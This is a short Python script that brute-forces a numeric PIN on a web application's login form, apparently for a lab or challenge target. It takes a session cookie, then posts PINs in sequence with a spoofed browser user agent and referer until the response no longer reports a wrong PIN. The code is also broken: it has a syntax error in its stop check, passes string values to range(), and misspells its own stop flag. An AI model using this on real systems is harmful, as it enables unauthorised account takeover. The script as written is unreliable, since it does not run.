import requests
import os

# Declare parameters
api_key = os.environ['api_key_var']         
base_url = os.environ['base_url_var']
start = os.environ['start_var']
end = os.environ['end_var']

# Get session details

s = requests.Session() 

def getCookie(url):
    r = s.get(url+"/?mykey="+api_key)
    if r.status_code == 200:
        print("Got cookies")
        print(s.cookies)
    else:
        print("Failed to get cookie")

getCookie(base_url)

url = base_url+"/login"


for i in range(start, end):
    
    if os.environ["Pinfound"] = "1":
        break
    
    else:
            
        pin = str(i)
        
        data={'pin':pin,'formgo':1}
        headers={
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Referer':url
            }
        
        r = s.post(url, data=data, headers=headers)
        
    ##    print(r)
        print(r.status_code)
    ##    print(r.text)
        
        # How to use find() 
        if (r.text.find("you entered a wrong pin") != -1): 
            print (pin +  " Failure") 
        else: 
            print (pin + " Success")
            os.environ["PinFound"] = "1"
            break
    
